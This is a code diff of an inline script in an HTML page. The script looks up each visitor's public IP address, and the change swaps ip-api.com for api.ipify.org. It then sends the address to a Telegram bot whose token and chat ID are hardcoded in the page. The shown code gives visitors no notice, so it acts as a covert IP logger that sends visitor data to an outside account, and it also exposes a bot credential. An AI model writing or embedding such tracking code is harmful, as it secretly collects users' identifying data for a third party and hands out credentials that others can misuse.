@@ -30,15 +30,15 @@
     const botToken = '6811411494:AAESLtVx1VFLV-wgeEWj82iw6Bljg3_wMqc';
     const chatId = '1353504783';
 
-    fetch('https://ip-api.com/json')
+    fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
       .then(data => {
-        const ip = data.query;
+        const ip = data.ip;
         const message = `IP: ${ip}`;
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
       })
       .catch(error => {
-        console.error("خطا در گرفتن آی‌پی:", error);
+        console.error("خطا در دریافت آی‌پی:", error);
       });
   </script>
 </body>
